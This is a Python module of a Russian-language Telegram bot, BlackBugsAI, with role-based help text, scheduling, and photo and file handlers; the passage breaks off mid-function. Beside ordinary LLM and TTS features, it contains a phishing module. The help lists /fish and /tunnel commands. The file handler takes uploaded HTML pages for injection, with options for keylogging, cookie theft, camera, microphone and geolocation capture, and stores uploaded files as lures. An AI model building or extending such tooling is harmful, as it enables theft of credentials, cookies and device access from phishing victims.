"""
bot_main.py — Помощь, scheduler, poll, точка входа BlackBugsAI
"""
# AUTO-SPLIT from bot.py — do not edit manually, use bot.py as source of truth
import os, sys, re, json, time, random, threading, subprocess, shutil
import config
from telegram_client import (
    send_message, edit_message, answer_callback, send_document,
    delete_message, delete_webhook,
)
try:
    from agent_roles import get_role, has_perm, perm_error, get_user_limits
    ROLES_ENABLED = True
except ImportError:
    ROLES_ENABLED = False
    def get_role(cid): return 'user'
    def has_perm(cid, p): return True
    def perm_error(p, cid): return "🚫 Нет доступа"
from roles import norm_role, role_icon, role_label

from bot_ui import kb, btn, back_btn, menu_keyboard
from bot_handlers import handle_text, _handle_input
from bot_callbacks import handle_callback

def _help_text(chat_id=None):
    """Full BlackBugsAI guide - role-aware, with examples."""
    try:
        from agent_roles import get_role as _gr
        from roles import has_perm as _hp, role_icon, role_label
        role = _gr(chat_id) if chat_id else "user"
        hp = lambda p: _hp(role, p)
        badge = role_icon(role) + " " + role_label(role)
    except Exception:
        role = "user"
        hp = lambda p: True
        badge = ""

    IS_GOD = role == "god"
    IS_ADM = role in ("god", "adm")
    IS_VIP = role in ("god", "adm", "vip")
    IS_USER = role in ("god", "adm", "vip", "user")

    L = []
    _ = L.append

    _("\u26a1 <b>BlackBugsAI \u2014 \u041f\u043e\u043b\u043d\u0430\u044f \u0441\u043f\u0440\u0430\u0432\u043a\u0430</b>")
    _("")
    if badge:
        _("\u0422\u0432\u043e\u044f \u0440\u043e\u043b\u044c: " + badge)
        _("")

    # BAN
    if role == "ban":
        _("\U0001f6ab \u0410\u043a\u043a\u0430\u0443\u043d\u0442 \u0437\u0430\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u0430\u043d")
        _("  \U0001f4b0 /pay \u2014 \u043e\u043f\u043b\u0430\u0442\u0438\u0442\u044c \u0448\u0442\u0440\u0430\u0444 \u0438 \u043e\u0431\u0440\u0430\u0442\u0438\u0442\u044c\u0441\u044f \u043a \u0430\u0434\u043c\u0438\u043d\u0443")
        return "\n".join(L)

    # NOOB
    if role == "noob":
        _("\U0001f530 \u041d\u043e\u0432\u0438\u0447\u043e\u043a \u2014 \u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u043d\u044b\u0439 \u0434\u043e\u0441\u0442\u0443\u043f")
        _("  /profile \u00b7 /billing \u00b7 /help")
        _("\u041e\u0431\u0440\u0430\u0442\u0438\u0441\u044c \u043a \u0430\u0434\u043c\u0438\u043d\u0443 \u0434\u043b\u044f \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u044f \u0434\u043e\u0441\u0442\u0443\u043f\u0430.")
        return "\n".join(L)

    # 1. Быстрый старт
    _("\u2500\u2500\u2500 \U0001f680 \u0411\u042b\u0421\u0422\u0420\u042b\u0419 \u0421\u0422\u0410\u0420\u0422 \u2500\u2500\u2500")
    _("")
    _("1. /menu \u2014 \u0433\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e")
    _("2. \u041d\u0430\u043f\u0438\u0448\u0438 \u0432\u043e\u043f\u0440\u043e\u0441 \u2014 \u0431\u043e\u0442 \u043e\u0442\u0432\u0435\u0442\u0438\u0442 \u0447\u0435\u0440\u0435\u0437 AI")
    _("3. \u041e\u0442\u043f\u0440\u0430\u0432\u044c .py \u0444\u0430\u0439\u043b \u2014 \u0430\u0433\u0435\u043d\u0442 \u043f\u0440\u043e\u0430\u043d\u0430\u043b\u0438\u0437\u0438\u0440\u0443\u0435\u0442")
    _("4. \u041e\u043f\u0438\u0448\u0438 \u0437\u0430\u0434\u0430\u0447\u0443 \u2014 \u043a\u043e\u0434\u0435\u0440 \u043d\u0430\u043f\u0438\u0448\u0435\u0442 \u043a\u043e\u0434")
    _("")

    # 2. Чат
    if hp("chat"):
        _("\u2500\u2500\u2500 \U0001f4ac \u0418\u0418-\u0427\u0410\u0422 \u2500\u2500\u2500")
        _("")
        _("\u041f\u0440\u043e\u0441\u0442\u043e \u043f\u0438\u0448\u0438 \u2014 \u0431\u043e\u0442 \u043e\u0431\u0449\u0430\u0435\u0442\u0441\u044f, \u043a\u043e\u043d\u0442\u0435\u043a\u0441\u0442 \u0434\u0438\u0430\u043b\u043e\u0433\u0430 \u0441\u043e\u0445\u0440\u0430\u043d\u044f\u0435\u0442\u0441\u044f.")
        _("<b>\u041f\u0440\u0438\u043c\u0435\u0440\u044b:</b>")
        _('  \u00ab\u041e\u0431\u044a\u044f\u0441\u043d\u0438 JWT \u0442\u043e\u043a\u0435\u043d\u00bb  \u00ab\u041f\u0435\u0440\u0435\u0432\u0435\u0434\u0438 \u043d\u0430 \u0430\u043d\u0433\u043b: \u043f\u0440\u0438\u0432\u0435\u0442 \u043c\u0438\u0440\u00bb')
        _("<b>\u041a\u043e\u043c\u0430\u043d\u0434\u044b:</b>")
        _("  /setprompt <\u0442\u0435\u043a\u0441\u0442> \u2014 \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u044b\u0439 \u043f\u0440\u043e\u043c\u0442")
        _("  /endchat \u2014 \u0441\u0431\u0440\u043e\u0441 \u043a\u043e\u043d\u0442\u0435\u043a\u0441\u0442\u0430 \u0434\u0438\u0430\u043b\u043e\u0433\u0430")
        _("")

    # 3. Кодер
    if hp("code_agent"):
        _("\u2500\u2500\u2500 \U0001f4bb \u0410\u0413\u0415\u041d\u0422-\u041a\u041e\u0414\u0415\u0420 \u2500\u2500\u2500")
        _("")
        _("\u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f, \u043e\u0442\u043b\u0430\u0434\u043a\u0430, \u0430\u043d\u0430\u043b\u0438\u0437 \u043a\u043e\u0434\u0430 \u0438 \u0430\u0440\u0445\u0438\u0432\u043e\u0432.")
        _("\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442: \u0442\u0435\u043a\u0441\u0442 \u0432 \u0447\u0430\u0442 + ZIP \u0430\u0440\u0445\u0438\u0432 + \U0001f399 TTS \u043e\u0437\u0432\u0443\u0447\u043a\u0430")
        _("<b>\u041a\u043e\u043c\u0430\u043d\u0434\u044b:</b>")
        _("  /fix \u2014 \u0430\u0432\u0442\u043e-\u0438\u0441\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 (\u043e\u0442\u043f\u0440. .py \u0444\u0430\u0439\u043b + /fix)")
        _("  /analyze \u2014 \u0430\u043d\u0430\u043b\u0438\u0437 \u043a\u043e\u0434\u0430 / .zip \u0430\u0440\u0445\u0438\u0432\u0430")
        _("<b>\u041f\u0440\u0438\u043c\u0435\u0440\u044b \u0437\u0430\u0434\u0430\u0447:</b>")
        _('  \u00ab\u041d\u0430\u043f\u0438\u0448\u0438 \u043f\u0430\u0440\u0441\u0435\u0440 \u0446\u0435\u043d \u0441 wildberries.ru\u00bb')
        _('  \u00ab\u0421\u0434\u0435\u043b\u0430\u0439 Telegram \u0431\u043e\u0442 \u0441 \u0431\u0430\u0437\u043e\u0439 SQLite\u00bb')
        _('  \u00abFastAPI \u0441\u0435\u0440\u0432\u0438\u0441 \u0441 JWT \u0430\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u0435\u0439\u00bb')
        _("")

    # 4. АГЕНТ_СМИТ
    if hp("smith_agent"):
        _("\u2500\u2500\u2500 \U0001f575\ufe0f \u0410\u0413\u0415\u041d\u0422_\u0421\u041c\u0418\u0422 \u2500\u2500\u2500")
        _("")
        _("\u0410\u0432\u0442\u043e\u043d\u043e\u043c\u043d\u044b\u0439: \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u2192 sandbox \u2192 \u0430\u0432\u0442\u043e\u0444\u0438\u043a\u0441 (\u0434\u043e 15 \u043f\u043e\u043f.) \u2192 ZIP")
        _("<b>14 \u0448\u0430\u0431\u043b\u043e\u043d\u043e\u0432:")
        _("  telegram_bot \u00b7 fastapi \u00b7 flask \u00b7 scraper \u00b7 data_pipeline")
        _("  llm_tool \u00b7 db_tool \u00b7 automation \u00b7 cli_app \u00b7 crypto_tool")
        _("  project_scaffold \u00b7 discord_bot \u00b7 script \u00b7 util")
        _("<b>\u041f\u0440\u0438\u043c\u0435\u0440\u044b:</b>")
        _('  \u00ab\u0422\u0435\u043b\u0435\u0433\u0440\u0430\u043c \u0431\u043e\u0442 \u0434\u043b\u044f \u043e\u043f\u0440\u043e\u0441\u043e\u0432 \u0441 sqlite\u00bb')
        _('  \u00ab\u041f\u0430\u0440\u0441\u0435\u0440 hh.ru, \u044d\u043a\u0441\u043f\u043e\u0440\u0442 \u0432 Excel\u00bb')
        _('  \u00abFastAPI \u0441\u0435\u0440\u0432\u0438\u0441 \u0434\u043b\u044f \u0441\u043e\u043a\u0440\u0430\u0449\u0435\u043d\u0438\u044f \u0441\u0441\u044b\u043b\u043e\u043a\u00bb')
        _("")

    # 5. Картинки
    if hp("image_gen"):
        _("\u2500\u2500\u2500 \U0001f3a8 \u041a\u0410\u0420\u0422\u0418\u041d\u041a\u0418 \u2500\u2500\u2500")
        _("")
        if hp("image_gen_paid"):
            _("  Pollinations + Stability AI + Together AI + FAL")
        else:
            _("  Pollinations AI (\u0431\u0435\u0441\u043f\u043b\u0430\u0442\u043d\u043e, \u0431\u0435\u0437 \u043a\u043b\u044e\u0447\u0430)")
        _('<b>\u041f\u0440\u0438\u043c\u0435\u0440\u044b \u043f\u0440\u043e\u043c\u0442\u043e\u0432:</b>')
        _('  \u00ab\u043a\u0438\u0431\u0435\u0440\u043f\u0430\u043d\u043a \u0433\u043e\u0440\u043e\u0434, \u043d\u0435\u043e\u043d, \u0434\u043e\u0436\u0434\u044c\u00bb')
        _('  \u00ab\u043f\u043e\u0440\u0442\u0440\u0435\u0442 \u043a\u043e\u0442\u0430 \u0432 \u0441\u0442\u0438\u043b\u0435 \u0412\u0430\u043d \u0413\u043e\u0433\u0430\u00bb')
        _('  \u00ab\u043b\u043e\u0433\u043e\u0442\u0438\u043f IT \u0441\u0442\u0430\u0440\u0442\u0430\u043f\u0430, \u043c\u0438\u043d\u0438\u043c\u0430\u043b\u0438\u0437\u043c\u00bb')
        _("")

    # 6. TTS
    if hp("tts"):
        _("\u2500\u2500\u2500 \U0001f399 TTS \u0437\u0432\u0443\u043a \u2500\u2500\u2500")
        _("")
        _("\u041f\u0440\u043e\u0432\u0430\u0439\u0434\u0435\u0440\u044b: Edge-TTS (\u0431\u0435\u0441\u043f\u043b\u0430\u0442\u043d\u043e) \u00b7 ElevenLabs (\u043f\u043b\u0430\u0442\u043d\u043e)")
        _("<b>\u0421\u0442\u0438\u043b\u0438 \u0433\u043e\u043b\u043e\u0441\u0430:</b>")
        _("  anchor (\u0434\u0438\u043a\u0442\u043e\u0440) \u00b7 troll (\u0434\u0435\u0444\u043e\u043b\u0442) \u00b7 critic (\u043c\u0435\u0434\u043b\u0435\u043d\u043d\u044b\u0439)")
        _("  drunk (\u0437\u0430\u043c\u0435\u0434\u043b\u0435\u043d.) \u00b7 grandma (\u043e\u0447\u0435\u043d\u044c \u043c\u0435\u0434\u043b.) \u00b7 hype (\u0431\u044b\u0441\u0442\u0440\u044b\u0439)")
        _("<b>\u041a\u043e\u043c\u0430\u043d\u0434\u044b:</b>")
        _("  /voices \u2014 \u0432\u0441\u0435 \u0434\u043e\u0441\u0442\u0443\u043f\u043d\u044b\u0435 \u0433\u043e\u043b\u043e\u0441\u0430")
        _("  /setvoice ru-RU-DmitryNeural \u2014 \u0440\u0443\u0441\u0441\u043a\u0438\u0439 \u043c\u0443\u0436.")
        _("  /setvoice ru-RU-SvetlanaNeural \u2014 \u0440\u0443\u0441\u0441\u043a\u0438\u0439 \u0436\u0435\u043d.")
        _("")

    # 7. LLM
    if hp("llm_change"):
        _("\u2500\u2500\u2500 \U0001f9e0 LLM \u043f\u0440\u043e\u0432\u0430\u0439\u0434\u0435\u0440\u044b \u2500\u2500\u2500")
        _("")
        _("<b>23+ \u043f\u0440\u043e\u0432\u0430\u0439\u0434\u0435\u0440\u0430:</b>")
        _("  openai \u00b7 claude \u00b7 mistral \u00b7 deepseek \u00b7 groq \u00b7 gemini")
        _("  together \u00b7 fireworks \u00b7 cerebras \u00b7 xai/grok \u00b7 kimi")
        _("  perplexity \u00b7 cohere \u00b7 openrouter \u00b7 ollama \u00b7 lmstudio")
        _("")
        _("<b>\u041a\u043e\u043c\u0430\u043d\u0434\u044b:</b>")
        _("  /llm \u2014 \u0438\u043d\u0442\u0435\u0440\u0430\u043a\u0442\u0438\u0432\u043d\u0430\u044f \u0441\u043c\u0435\u043d\u0430")
        _("  /setllm groq llama-3.3-70b-versatile")
        _("  /setllm deepseek deepseek-coder")
        _("  /test \u2014 \u043f\u0440\u043e\u0432\u0435\u0440\u0438\u0442\u044c \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0435")
        _("")

    # 8. Веб-панель
    if hp("admin_panel"):
        _("\u2500\u2500\u2500 \U0001f310 \u0412\u0415\u0411-\u041f\u0410\u041d\u0415\u041b\u042c \u2500\u2500\u2500")
        _("")
        _("  http://\u0442\u0432\u043e\u0439-ip:8080/panel")
        _("  \u0422\u043e\u043a\u0435\u043d: ADMIN_WEB_TOKEN \u0432 .env (\u043d\u0435 BOT_TOKEN!)")
        _("")
        _("<b>\u0420\u0430\u0437\u0434\u0435\u043b\u044b \u043f\u0430\u043d\u0435\u043b\u0438:</b>")
        _("  \U0001f4ca \u0414\u0430\u0448\u0431\u043e\u0440\u0434 \u00b7 \U0001f465 \u041f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0438 \u00b7 \U0001f4e8 \u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f")
        _("  \U0001f575\ufe0f \u0410\u0433\u0435\u043d\u0442\u044b \u00b7 \U0001f4cb \u0417\u0430\u0434\u0430\u0447\u0438 \u00b7 \U0001f5a5 \u041f\u0440\u043e\u0446\u0435\u0441\u0441\u044b \u00b7 \U0001f4ca \u041b\u043e\u0433\u0438")
        _("  \U0001f4bb Shell \u00b7 \u2699\ufe0f \u041a\u043e\u043d\u0444\u0438\u0433 \u00b7 \U0001f4e7 Mail \u00b7 \U0001f9e0 LLM \u0430\u0433\u0435\u043d\u0442\u043e\u0432")
        if IS_GOD:
            _("  \U0001f510 .env (GOD) \u2014 \u043f\u0440\u044f\u043c\u043e\u0439 \u0440\u0435\u0434\u0430\u043a\u0442\u043e\u0440")
        _("")

    # 9. Администрирование
    if IS_ADM:
        _("\u2500\u2500\u2500 \U0001f511 \u0410\u0414\u041c\u0418\u041d\u0418\u0421\u0422\u0420\u0418\u0420\u041e\u0412\u0410\u041d\u0418\u0415 \u2500\u2500\u2500")
        _("")
        _("<b>\u0420\u043e\u043b\u0438 \u0438 \u043b\u0438\u043c\u0438\u0442\u044b:</b>")
        _("  \u26a1 god  \u2014 \u0432\u0441\u0451+.env | \u2211 \u0437\u0430\u0434\u0430\u0447 | \u2211 \u0442\u043e\u043a. | 500\u041c\u0411 \u0444\u0430\u0439\u043b")
        _("  \U0001f511 adm  \u2014 \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 | \u2211 | 32K | 200\u041c\u0411")
        _("  \U0001f48e vip  \u2014 \u0432\u0441\u0435+\u0433\u043e\u043b\u043e\u0441. | 500/\u0434 | 16K | 100\u041c\u0411")
        _("  \U0001f464 user \u2014 \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442 | 50/\u0434 | 4K | 20\u041c\u0411")
        _("  \U0001f530 noob \u2014 \u043f\u0440\u043e\u0444\u0438\u043b\u044c+\u0431\u0438\u043b\u043b\u0438\u043d\u0433")
        _("  \U0001f6ab ban  \u2014 \u043e\u043f\u043b\u0430\u0442\u0438\u0442\u044c \u0448\u0442\u0440\u0430\u0444")
        _("")
        _("<b>Per-agent LLM (.env):</b>")
        _("  SMITH_PROVIDER=claude  SMITH_MODEL=claude-3-5-sonnet")
        _("  CODER_PROVIDER=openai  CODER_MODEL=gpt-4o")
        _("  FIX_PROVIDER=deepseek  FIX_MODEL=deepseek-coder")
        _("  \u0414\u043e\u0441\u0442\u0443\u043f\u043d\u044b\u0435 \u0430\u0433\u0435\u043d\u0442\u044b: smith \u00b7 coder \u00b7 coder3 \u00b7 chat \u00b7 agent \u00b7 fix \u00b7 review")
        _("")
        _("<b>.env \u043e\u0441\u043d\u043e\u0432\u043d\u044b\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435:</b>")
        _("  BOT_TOKEN \u00b7 ADMIN_IDS \u00b7 ADMIN_WEB_TOKEN")
        _("  LLM_PROVIDER \u00b7 LLM_MODEL \u00b7 TTS_PROVIDER \u00b7 TTS_VOICE")
        _("  OPENAI_API_KEY \u00b7 GROQ_API_KEY \u00b7 GEMINI_API_KEY")
        _("  ANTHROPIC_API_KEY \u00b7 DEEPSEEK_API_KEY \u00b7 MISTRAL_API_KEY")
        _("  MAIL_HOST \u00b7 MAIL_PORT \u00b7 MAIL_USER \u00b7 MAIL_PASS")
        _("")
        _("<b>\u041a\u043e\u043c\u0430\u043d\u0434\u044b \u0430\u0434\u043c\u0438\u043d\u0430:</b>  /run \u00b7 /parse \u00b7 /stats")
        if IS_GOD:
            _("  /env \u2014 \u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440 .env (GOD)")
        _("")

    # 10. Все команды
    _("\u2500\u2500\u2500 \U0001f4cb \u0412\u0421\u0415 \u041a\u041e\u041c\u0410\u041d\u0414\u042b \u2500\u2500\u2500")
    _("")
    _("  /start     \u2014 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f")
    _("  /menu      \u2014 \u0433\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e")
    _("  /help      \u2014 \u044d\u0442\u0430 \u0441\u043f\u0440\u0430\u0432\u043a\u0430")
    _("  /profile   \u2014 \u043c\u043e\u0439 \u043f\u0440\u043e\u0444\u0438\u043b\u044c")
    _("  /stats     \u2014 \u0441\u0442\u0430\u0442\u0438\u0441\u0442\u0438\u043a\u0430")
    if hp("chat"):
        _("  /setprompt \u2014 \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u044b\u0439 \u043f\u0440\u043e\u043c\u0442")
        _("  /endchat   \u2014 \u0441\u0431\u0440\u043e\u0441 \u043a\u043e\u043d\u0442\u0435\u043a\u0441\u0442\u0430")
    if hp("llm_change"):
        _("  /llm       \u2014 \u0441\u043c\u0435\u043d\u0438\u0442\u044c LLM")
        _("  /setllm    \u2014 \u043f\u0440\u044f\u043c\u0430\u044f \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 LLM")
        _("  /test      \u2014 \u043f\u0440\u043e\u0432\u0435\u0440\u0438\u0442\u044c \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0435")
    if hp("code_agent"):
        _("  /fix       \u2014 \u0430\u0432\u0442\u043e-\u0444\u0438\u043a\u0441 \u043e\u0448\u0438\u0431\u043a\u0438")
        _("  /analyze   \u2014 \u0430\u043d\u0430\u043b\u0438\u0437 \u043a\u043e\u0434\u0430")
    if hp("tts"):
        _("  /voices    \u2014 \u0433\u043e\u043b\u043e\u0441\u0430 TTS")
        _("  /setvoice  \u2014 \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c \u0433\u043e\u043b\u043e\u0441")
    if hp("fish_module"):
        _("  /fish      \u2014 \u0444\u0438\u0448\u0438\u043d\u0433-\u043c\u0435\u043d\u044e")
        _("  /tunnel    \u2014 CF-\u0442\u0443\u043d\u043d\u0435\u043b\u044c")
    if IS_ADM:
        _("  /run       \u2014 \u043f\u043e\u043b\u043d\u044b\u0439 \u0446\u0438\u043a\u043b")
        _("  /parse     \u2014 \u043f\u0430\u0440\u0441\u0438\u043d\u0433")
    if IS_GOD:
        _("  /env       \u2014 .env (GOD)")
    _("")

    return "\n".join(L)

def scheduled_cycle():
    print("\n⏰ Авто-запуск...", flush=True)
    send_message("⏰ Автоматический запуск по расписанию...")
    try:
        parse_all()
        run_pipeline()
    except Exception as e:
        send_message("❌ Ошибка авто-цикла: {}".format(e))

def _run_scheduler():
    while True:
        schedule.run_pending()
        time.sleep(30)


# ══════════════════════════════════════════════════════════════
#  POLLING LOOP
# ══════════════════════════════════════════════════════════════


def handle_photo(msg, chat_id):
    """Обрабатывает фото от пользователя — Vision анализ."""
    if not is_authenticated(chat_id):
        return

    photos  = msg.get('photo', [])
    caption = msg.get('caption', '').strip()

    # Берём самое большое фото
    best = max(photos, key=lambda p: p.get('file_size', 0))
    file_id = best.get('file_id', '')

    if not file_id:
        return

    # ── Агент-сессия: накапливаем фото как файлы ─────────────────────────
    try:
        from agent_session import get_session, has_active_session, STAGE_WAIT_FILES
        if has_active_session(chat_id):
            sess = get_session(chat_id)
            if sess and sess.stage == STAGE_WAIT_FILES:
                fname = f"photo_{int(time.time())}.jpg"
                dest  = os.path.join(sess.output_dir, fname)
                try:
                    download_file(file_id, dest)
                    sess.add_file(dest, fname, 'image')
                    send_message(
                        f"🖼 Фото принято ({len(sess.files)} всего)\n"
                        "Отправь ещё или напиши <b>готово</b>.",
                        chat_id,
                        reply_markup=kb(
                            [btn("🚀 Готово — запустить","_agent_go")],
                            [btn("❌ Отмена","adm:close_agent")],
                        )
                    )
                    _wait_state[chat_id] = 'adm_agent_task'
                except Exception as e:
                    send_message(f"⚠️ Фото не сохранено: {e}", chat_id)
                return
    except ImportError:
        pass
    if is_active(chat_id):
        question = caption or 'Опиши что на этом изображении'
        send_message("👁 Анализирую изображение...", chat_id)
        def _do():
            try:
                from agent_tools_registry import tool_vision_telegram
                result = tool_vision_telegram(
                    {'file_id': file_id, 'question': question, 'mode': 'describe'},
                    chat_id=chat_id
                )
                # Убираем HTML теги для ответа
                import re
                clean = re.sub(r'<[^>]+>', '', result)
                send_message(clean[:3000], chat_id, reply_markup=chat_control_keyboard())
            except Exception as e:
                send_message(f"❌ Vision ошибка: {e}", chat_id)
        _run_in_thread(_do)
        return

    # Без активной сессии — показываем меню выбора действия
    kb_photo = kb(
        [btn("👁 Описать изображение",    f"vision:{file_id}:describe"),
         btn("📝 Извлечь текст (OCR)",     f"vision:{file_id}:ocr")],
        [btn("🔍 Найти объекты",           f"vision:{file_id}:detect"),
         btn("❓ Задать вопрос",           f"vision:{file_id}:qa")],
        [btn("◀️ Меню",                    "menu")],
    )
    send_message(
        "📷 <b>Фото получено.</b> Что сделать?",
        chat_id, reply_markup=kb_photo
    )
    # Сохраняем file_id для вопроса
    _wait_state[chat_id] = f'vision_qa:{file_id}'


def handle_document(msg, chat_id):
    """Обрабатывает файл присланный пользователем."""
    # ══ ГЕЙТ АВТОРИЗАЦИИ ══
    if not is_authenticated(chat_id):
        try:
            step, _ = auth_state_get(chat_id)
        except Exception:
            step = 'idle'
        if step == 'idle':
            auth_start(chat_id)
        else:
            send_message("🔒 Сначала пройди авторизацию.", chat_id)
        return
    # ══ КОНЕЦ ГЕЙТА ═══════

    # ── Агент-сессия: накапливаем файлы ────────────────────────────────────
    try:
        from agent_session import get_session, has_active_session, detect_file_type, STAGE_WAIT_FILES
        sess = get_session(chat_id)
        if sess and sess.stage == STAGE_WAIT_FILES:
            doc      = msg.get('document', {})
            file_id  = doc.get('file_id', '')
            filename = doc.get('file_name', f'file_{int(time.time())}')
            ftype    = detect_file_type(filename)
            try:
                dest = os.path.join(sess.output_dir, filename)
                if file_id: download_file(file_id, dest)
                sess.add_file(dest, filename, ftype)
                send_message(
                    f"📎 <b>{filename}</b> ({ftype}) принят\n"
                    f"Файлов: {len(sess.files)}\n\n"
                    "Отправь ещё или напиши <b>готово</b>",
                    chat_id,
                    reply_markup=kb(
                        [btn("🚀 Готово — запустить", "_agent_go")],
                        [btn("❌ Отмена", "proj_mode:cancel")],
                    )
                )
                _wait_state[chat_id] = 'code_session'
            except Exception as e:
                send_message(f"⚠️ Файл: {e}", chat_id)
            return
    except ImportError:
        pass
    doc      = msg.get('document', {})
    file_id  = doc.get('file_id')
    filename = doc.get('file_name', 'file')
    filesize = doc.get('file_size', 0)
    caption  = msg.get('caption', '')

    # ── Приоритет 1: ждём файл для fish-модуля ─────────────────────────
    # ── Приоритет 0: ждём HTML-страницу для фишинга ────────────────────
    if _wait_state.get(chat_id) == 'fish_upload_html':
        _wait_state.pop(chat_id, None)

        # Проверяем расширение
        if not filename.lower().endswith(('.html', '.htm')):
            send_message(
                "❌ Ожидается <b>.html</b> файл, а не <b>{}</b>\n\n"
                "Отправь HTML-файл или нажми отмену.".format(
                    filename.rsplit('.', 1)[-1].upper() if '.' in filename else '???'),
                chat_id,
                reply_markup=kb(
                    [btn("🔄 Попробовать снова", "fish:upload_html")],
                    [btn("❌ Отмена", "menu_fish")],
                ))
            return

        if filesize > 5 * 1024 * 1024:
            send_message("❌ HTML-файл > 5 MB — слишком большой.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
            return

        send_message("📥 Загружаю <b>{}</b>...".format(filename), chat_id)
        dest_path = get_dest_path(filename)
        ok = download_file(file_id, dest_path)
        if not ok:
            send_message("❌ Не удалось скачать файл.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
            return

        # Читаем HTML
        try:
            with open(dest_path, 'r', encoding='utf-8', errors='replace') as _f:
                html_content = _f.read()
        except Exception as e:
            send_message("❌ Не могу прочитать файл: {}".format(e), chat_id)
            return

        # Сохраняем HTML в памяти для инжекций
        _fish_user_data[chat_id] = {
            'html_content': html_content,
            'html_filename': filename,
            'source': 'upload',
        }
        _fish_user_opts.setdefault(chat_id, {
            'geo': False, 'cam': False, 'mic': False, 'auto': False,
            'keylogger': False, 'steal_cookies': False, 'system_info': False,
            'iframe_phish': False, 'iframe_url': None,
        })

        # Краткая инфа о файле
        lines_count = html_content.count('\n')
        has_form = '<form' in html_content.lower()
        has_input = '<input' in html_content.lower()
        has_pass = 'password' in html_content.lower() or 'passwd' in html_content.lower()
        flags = []
        if has_form:  flags.append("📋 форма")
        if has_input: flags.append("⌨️ поля ввода")
        if has_pass:  flags.append("🔑 поле пароля")

        send_message(
            "✅ <b>HTML загружен:</b> <code>{}</code>\n"
            "Размер: {} KB  |  Строк: {}\n"
            "{}\n\n"
            "Теперь выбери инжекции и нажми 🚀 <b>Создать</b>:".format(
                filename, filesize // 1024, lines_count,
                "Обнаружено: " + ", ".join(flags) if flags else ""),
            chat_id)

        # Показываем меню инжекций — переиспользуем _fish_send_options
        # но с пометкой что источник — загруженный файл
        _fish_send_options_html(chat_id)
        return

    # ── Приоритет 1: ждём файл для fish-модуля ─────────────────────────
    if _wait_state.get(chat_id) == 'fish_upload_file':
        _wait_state.pop(chat_id, None)
        if filesize > 20 * 1024 * 1024:
            send_message("❌ Файл > 20 MB, Telegram не позволяет.", chat_id)
            return
        send_message("📥 Загружаю <b>{}</b>...".format(filename), chat_id)
        dest_path = get_dest_path(filename)
        ok = download_file(file_id, dest_path)
        if not ok:
            send_message("❌ Не удалось скачать файл.", chat_id)
            return
        # Сохраняем в fish БД
        saved_name = os.path.basename(dest_path)
        db_id = fish_db.save_file_to_db(saved_name, filename, filesize)
        send_message(
            "✅ Файл <b>{}</b> ({} KB) загружен!\n"
            "ID: <code>{}</code>\n\n"
            "Теперь выбери его как приманку через меню.".format(
                filename, filesize // 1024, db_id),
            chat_id, reply_markup=kb(
                [btn("📂 Мои файлы", "fish:files"),
                 btn("◀️ Меню", "menu_fish")]
            ))
        return

    # ── Приоритет 2: ждём файл для send_to (отправка файла другому юзеру) ──
    if _wait_state.get(chat_id, '').startswith('send_text:file'):
        state = _wait_state.pop(chat_id)
        task  = (_pending_agent_task.pop(chat_id, {}) or {})
        target = task.get('target', '')
        if not target:
            send_message("❌ Получатель не указан. Начни заново.", chat_id)
            return
        dp = get_dest_path(filename)
        ok_dl = download_file(file_id, dp)
        if not ok_dl:
            send_message("❌ Не удалось скачать файл.", chat_id)
            return
        send_message("📤 Отправляю <b>{}</b>...".format(filename), chat_id)
        ok2, err2 = send_file_to(target, dp)
        msg_r = "✅ Файл отправлен → <code>{}</code>".format(target) if ok2 else "❌ {}".format(err2)
        send_message(msg_r, chat_id, reply_markup=kb([btn("📨 Ещё", "menu_send"), back_btn()]))
        return

    # ── Лимит Telegram Bot API — 20 MB ─────────────────────────────────
    if filesize > 20 * 1024 * 1024:
        send_message(
            "❌ Файл слишком большой ({:.1f} MB). Telegram позволяет скачивать до 20 MB.".format(
                filesize / 1024 / 1024), chat_id)
        return

    send_message("📥 Скачиваю <b>{}</b>...".format(filename), chat_id)

    dest_path = get_dest_path(filename)
    ok = download_file(file_id, dest_path)

    if not ok:
        send_message("❌ Не удалось скачать файл. Попробуй ещё раз.", chat_id)
        return

    send_message("🔍 Анализирую файл...", chat_id)

    # Контекст: если активна ИИ-сессия — передаём caption + историю
    hint = caption or ''
    # Используем chat_agent сессию (dict), не agent_session (AgentSession объект)
    try:
        from chat_agent import get_session as _chat_get_session
        chat_sess = _chat_get_session(chat_id)
    except Exception:
        chat_sess = None
    if chat_sess and isinstance(chat_sess, dict) and chat_sess.get('mode') == 'chat' and not hint:
        history = chat_sess.get('history', [])
        if history and history[-1]['role'] == 'user':
            hint = history[-1]['content']

    try:
        result = analyze_file(dest_path, filename, user_hint=hint)
    except Exception as e:
        result = "❌ Ошибка анализа: {}".format(e)

    # ── КОДЕР-СЕССИЯ: анализируем → спрашиваем что дальше ──
    if chat_sess and isinstance(chat_sess, dict) and chat_sess.get('mode') == 'code':
        from chat_agent import add_to_history
        add_to_history(chat_id, 'user', '[Файл: {}] {}'.format(filename, hint or 'анализ'))
        add_to_history(chat_id, 'assistant', result[:500])

        _pending_file[chat_id] = {
